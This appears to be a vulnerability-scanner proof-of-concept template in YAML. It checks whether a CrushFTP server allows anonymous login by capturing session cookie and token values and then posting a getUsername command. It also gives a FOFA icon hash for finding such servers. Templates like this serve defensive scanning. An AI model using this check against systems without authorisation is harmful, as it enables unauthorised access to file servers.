id: poc-yaml-crushftp-anonymous-login
info:
  name: crushftp 匿名用户登录漏洞
  severity: high
  tags:
  - 认证绕过
  finger: crushftp
  fofa: icon_hash="-1022206565"
requests:
- method: GET
  path: /WebInterface/
  expression: status_code == 404 && contains(headers,"CrushFTP HTTP Server")
  output:
  - regex_match(headers,"CrushAuth=(?P<cookie>.*?); path=")
  - regex_match(headers,"currentAuth=(?P<token>.*?); path=")
- method: POST
  path: /WebInterface/function/
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: CrushAuth={{.cookie}}
  data: command=getUsername&random=0.4186510822713485&c2f={{.token}}
  expression: 'status_code == 200 &&

    contains(body,"<response>success</response>") &&

    contains(body,"<username>anonymous</username>") &&

    contains(content_type,"text/xml")

    '
variables: {}
transport: http
